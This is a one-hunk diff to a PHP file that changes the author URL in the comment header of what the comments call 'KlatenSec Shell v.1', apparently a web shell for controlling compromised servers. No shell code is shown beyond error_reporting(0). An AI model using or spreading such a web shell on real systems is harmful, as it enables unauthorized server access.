@@ -161,7 +161,7 @@ error_reporting(0);
 
 // KlatenSec Shell v.1
 // Coded by: pajaar :p
-// Author URI: github.com/paja-R
+// Author URI: github.com/pajaar
 // yeah this is open sOURce this code is ours
 // free recode but don't delete author name :d
 // contact me if u have question 
